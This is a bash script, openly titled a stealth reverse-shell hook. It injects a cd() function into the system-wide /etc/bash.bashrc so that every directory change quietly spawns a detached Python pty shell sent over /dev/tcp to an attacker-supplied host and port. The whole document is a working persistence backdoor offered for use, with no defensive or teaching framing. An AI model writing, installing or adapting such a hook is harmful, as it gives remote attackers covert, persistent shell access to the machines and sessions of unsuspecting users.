#!/bin/bash

# === Stealth Reverse Shell Hook for 'cd' ===
# Reverse shell to: RHOST on RPORT
# Injects into /etc/bash.bashrc
### Builds a python shell for ease of visual/function 
### Shell is established whenever cd command is used

TARGET_BASHRC="/etc/bash.bashrc"

echo "[+] Installing 'cd' hook..."

# Check if already present
if grep -q "# cd hook" "$TARGET_BASHRC"; then
    echo "[*] Hook already exists. Skipping install."
    exit 0
fi

# Inject the silent, persistent reverse shell cd() function
cat << 'EOF' >> "$TARGET_BASHRC"


# cd hook
cd() {
  builtin cd "$@" || return
  ( nohup setsid bash -c 'python -c "import pty; pty.spawn(\"/bin/bash\")"' >& /dev/tcp/$RHOST/$RPORT 0>&1 </dev/null >/dev/null 2>&1 & )
}

EOF

echo "[+] Hook injected with dynamic IP/port."